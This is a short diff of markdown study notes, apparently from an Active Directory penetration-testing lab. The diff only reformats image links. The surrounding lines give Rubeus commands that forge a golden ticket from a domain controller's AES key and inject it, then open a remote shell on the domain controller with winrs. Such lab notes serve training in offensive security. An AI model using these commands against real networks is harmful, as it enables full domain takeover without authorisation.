@@ -44,12 +44,12 @@ Run ether DCSync or extracting secrets from DC -- if you need the AES key, you n
 use rubeus to forge a golden ticket
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<aes_key> /ldap /user:Administrator /printcmd`
 - /printcmd will give us a command to run to recreate the ticket with the information used within the Rubeus ticket
-![[assets/Pasted image 20260204042226.png]]
+![Pasted image 20260204042226](assets/Pasted%20image%2020260204042226.png)
 - the only change we're going to do is run it with loader, change a couple of the beginning parameters, and add /ptt at the end
 	- `C:\AD\Tools\Loader.exe path C:\AD\Tools\Rubeus.exe -args evasive-golden ....... /ptt`
 		- binary paths and evasive-golden instead of Evasive-Golden
 
 once the ticket is imported, access the DC
 `winrs -r:dcorp-dc cmd`
-![[assets/Pasted image 20260204042455.png]]
+![Pasted image 20260204042455](assets/Pasted%20image%2020260204042455.png)
 
